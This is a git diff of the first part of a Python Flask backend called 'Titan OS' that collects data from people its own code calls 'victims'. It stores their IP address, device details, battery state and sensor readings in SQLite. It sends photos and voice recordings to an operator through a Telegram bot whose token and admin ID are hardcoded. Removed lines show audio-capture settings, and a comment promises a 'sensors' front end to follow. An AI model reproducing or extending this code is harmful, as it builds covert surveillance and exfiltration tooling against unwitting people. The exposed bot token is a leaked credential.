@@ -1,103 +1,39 @@
 # ============================================================
 # PROJECT: THE TITAN OS - ULTIMATE EDITION (V6.0)
 # OWNER: SIUF-PRO (سيوفي)
-# PURPOSE: ADVANCED SYSTEM MONITORING & CONTROL
-# STATUS: PART 1 - CORE ARCHITECTURE
+# STATUS: PART 1 - CORE ARCHITECTURE (FIXED)
 # ============================================================
 
-import os
-import json
-import sqlite3
-import datetime
-import requests
-import base64
-import random
-import string
-import logging
+import os, json, sqlite3, datetime, requests, base64, logging
 from io import BytesIO
-from threading import Thread
 from flask import Flask, render_template_string, request, jsonify
 
-# --- GLOBAL CONFIGURATION OBJECT ---
+# --- CONFIGURATION ---
 class GlobalConfig:
     def __init__(self):
         self.BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
         self.ADMIN_ID = "7041600701"
         self.BASE_URL = "https://sif-pro.onrender.com"
         self.DB_NAME = "titan_master_vault.db"
-        self.VERSION = "6.0.1"
-        self.AGENT_NAME = "Titan_Elite_Agent"
-        self.LOG_FILE = "system_runtime.log"
-
-    def get_headers(self):
-        return {
-            "User-Agent": self.AGENT_NAME,
-            "Content-Type": "application/json"
-        }
+        self.VERSION = "6.0.2"
 
 CONFIG = GlobalConfig()
+app = Flask(__name__)
 
-# --- ADVANCED LOGGING SYSTEM ---
-logging.basicConfig(
-    filename=CONFIG.LOG_FILE,
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s'
-)
-
-# --- DATABASE MANAGER (SQLITE3) ---
+# --- DATABASE MANAGER ---
 class DatabaseManager:
     def __init__(self, db_path):
         self.db_path = db_path
-        self.setup_tables()
-
+    
     def connect(self):
         return sqlite3.connect(self.db_path)
 
     def setup_tables(self):
-        """تهيئة الجداول الأساسية للنظام العملاق"""
         conn = self.connect()
         cursor = conn.cursor()
-        
-        # جدول الضحايا المتقدم
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS victims (
-                v_id INTEGER PRIMARY KEY AUTOINCREMENT,
-                ip_address TEXT,
-                country TEXT,
-                city TEXT,
-                device_brand TEXT,
-                os_version TEXT,
-                battery_level TEXT,
-                is_charging INTEGER,
-                sensor_data TEXT,
-                last_seen TEXT
-            )
-        ''')
-
-        # جدول الإعدادات الديناميكية
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS system_settings (
-                setting_key TEXT PRIMARY KEY,
-                setting_value TEXT
-            )
-        ''')
-
-        # جدول السجلات (Logs)
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS activity_logs (
-                log_id INTEGER PRIMARY KEY AUTOINCREMENT,
-                v_id INTEGER,
-                action_type TEXT,
-                details TEXT,
-                timestamp TEXT
-            )
-        ''')
-
-        # إدخال الإعدادات الافتراضية
+        cursor.execute('''CREATE TABLE IF NOT EXISTS victims (v_id INTEGER PRIMARY KEY AUTOINCREMENT, ip_address TEXT, device_brand TEXT, os_version TEXT, battery_level TEXT, is_charging INTEGER, sensor_data TEXT, last_seen TEXT)''')
+        cursor.execute('''CREATE TABLE IF NOT EXISTS system_settings (setting_key TEXT PRIMARY KEY, setting_value TEXT)''')
         cursor.execute("INSERT OR IGNORE INTO system_settings (setting_key, setting_value) VALUES ('active_template', 'security_v1')")
-        cursor.execute("INSERT OR IGNORE INTO system_settings (setting_key, setting_value) VALUES ('capture_audio', 'enabled')")
-        cursor.execute("INSERT OR IGNORE INTO system_settings (setting_key, setting_value) VALUES ('capture_delay', '3000')")
-        
         conn.commit()
         conn.close()
 
@@ -105,51 +41,33 @@ class DatabaseManager:
         conn = self.connect()
         cursor = conn.cursor()
         cursor.execute(query, params)
-        data = cursor.fetchall() if fetch else None
+        data = cursor.fetchall() if fetch else cursor.lastrowid
         conn.commit()
         conn.close()
         return data
 
-# Initialize the manager
 DB = DatabaseManager(CONFIG.DB_NAME)
 
-# --- TELEGRAM COMMAND CENTER ---
+# --- TELEGRAM ENGINE ---
 class TelegramEngine:
     def __init__(self, token, admin_id):
         self.api_url = f"https://api.telegram.org/bot{token}"
         self.admin_id = admin_id
 
     def send_notification(self, text, parse_mode="Markdown"):
-        payload = {
-            "chat_id": self.admin_id,
-            "text": text,
-            "parse_mode": parse_mode
-        }
-        try:
-            return requests.post(f"{self.api_url}/sendMessage", json=payload).json()
-        except Exception as e:
-            logging.error(f"Telegram Send Error: {e}")
-            return None
+        return requests.post(f"{self.api_url}/sendMessage", json={"chat_id": self.admin_id, "text": text, "parse_mode": parse_mode}).json()
 
     def send_media(self, media_type, file_object, caption=""):
-        files = {media_type: file_object}
-        data = {"chat_id": self.admin_id, "caption": caption}
         method = "sendPhoto" if media_type == "photo" else "sendVoice"
-        try:
-            return requests.post(f"{self.api_url}/{method}", data=data, files=files).json()
-        except Exception as e:
-            logging.error(f"Telegram Media Error: {e}")
-            return None
+        return requests.post(f"{self.api_url}/{method}", data={"chat_id": self.admin_id, "caption": caption}, files={media_type: file_object}).json()
 
 TG = TelegramEngine(CONFIG.BOT_TOKEN, CONFIG.ADMIN_ID)
 
-# --- FLASK APP CORE ---
-app = Flask(__name__)
-
-@app.before_first_request
-def startup_checks():
-    logging.info("🚀 Titan System Core is booting up...")
-    print(f"Titan OS v{CONFIG.VERSION} - Initializing...")
+# --- FIX: INITIALIZATION FOR FLASK 3.0 ---
+# بدل before_first_request نستخدم هذا السياق
+with app.app_context():
+    DB.setup_tables()
+    print(f"🚀 Titan OS v{CONFIG.VERSION} - Initialized Successfully")
 
 # نهاية القسم الأول - يتبع بالقسم الثاني (المحرك الأمامي والحساسات)
 # ============================================================
